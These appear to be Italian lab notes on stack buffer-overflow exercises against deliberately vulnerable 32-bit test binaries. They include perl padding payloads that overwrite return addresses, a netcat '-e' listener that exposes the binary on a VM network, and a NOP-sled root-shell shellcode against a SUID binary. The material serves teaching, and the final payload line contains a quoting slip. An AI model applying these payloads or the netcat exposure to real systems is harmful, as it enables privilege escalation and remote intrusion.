# Processi in memoria   
Il programmatore vede gli **indirizzi virtuali**, tradotti dall'OS in **indirizzi fisici.**

- Lo stack cresce verso indirizzi più bassi
- L'heap cresce verso indirizzi più alti

# Esercizi
## returnlib

**Obiettivo**: analizzare il codice

**Strategia**: disassemblare il main, trovare chiamate a funzione

```sh
gcc -o es -fno-stack-protector -m32 -z execstack es.c

gdb ./es
disas main

# trovo la funzione vulnerable
disas vuln

# eseguo con un valore
run 10
```

## write_var

**Obiettivo**: scrivere un valore in una variabile locale

**Strategia**: "rompere" l'array con un numero elevato

```sh
run $(perl -e 'print "A"x150')
# La variabile è 414141... ovvero le A. Poi dà segm. ault

run $(perl -e 'print "A"x104',"EDCB") 
# 104 caratteri di A che rompono lo stack e EDCB che è il valore che in ascii volevamo ottenere 

```

# secret_function

**Obiettivo**: eseguire una funzione segreta

**Strategia**: trovare l'indirizzo della funzione e sovrascrivere il return address

```sh

info functions 

# trovo l'indirizzo della funzione secret: 0x565561ad
# RICORDA: LITTLE ENDIAN

run $(perl -e 'print "A"x16,"\xad\x61\x55\x56"')
# 16 A che rompono lo stack, 4 B che sono il return address e l'indirizzo della funzione segreta
```

# secret_function_remote

- ```nc -l -p 8000  -e ./es```: Mi metto in ascolto sulla porta 8000 e, tutto ciò che viene messo nello standard input della pora 8000 viene messo nello standard input del processo ./es

- su ```eth1``` della macchina vedo il mio ip host only (192.168.56.6). Mi connetto dalla **macchina host** a ```nc 192.168.56.6 8000```
- Ora provo a scrivere il payload malevolo ```$(perl -e 'print "A"x16,"\xad\x61\x55\x56"')``` dalla macchina host


- fa partire il comando cat che si mette in ascolto della tastiera e redirezionerà tutto in una shell aperta nel testo

- **comando macchina host**: ```{ perl -e 'print "A"x16, "\xad\x61\x55\x56"'; cat; } | nc 192.168.56.6 8000```

# shellcode

**Obiettivo**: eseguire un comando shell 

**Strategia**: scrivere un comando shell in assembly, compilarlo e metterlo in un array

1. Assegna il binario all'utente root e setta il SUID
```sh
chown root:root es
chmod u+s es
```

2. Eseguo gdb con sudo, e analizzo facendo ```disas``` sia **main** sia **vuln**

3. Navigo un po' con il padding mettendo A (dati mock) e B (indirizzi di ritorno) fin quando non vedo 424242 e nessun 41 

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()

```sh
run $(perl -e 'print "A"x112,"BBBB"')
```

4. Visualizzo lo stack

```sh   
x/200xw $esp

# Riesco a vedere i 41 (A) e i 42(B) indirizzi di ritorno sovrascritti
# A sinistra vedo un indirizzo di ritorno plausibile, dove sono le A

```

5. Calcolo la lunghezza dello shellcode con ```python -> len(b'shellcode.txt')```, è di 46 byte

6. Visto che ci servono 112byte di padding + 4 di ritorno, e ne abbiamo 46 di shellcode, il calcolo è


	[66 byte di nop (in ascii \x90 ) ] +
	[ 46 byte di shellcode  ] + 
	[ 4 byte di indirizzo (ricorda tutto little endian)  ]

```sh

$(perl -e print' "\x90"x66, "\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68", "\x90\xd5\xff\xff " ')

```
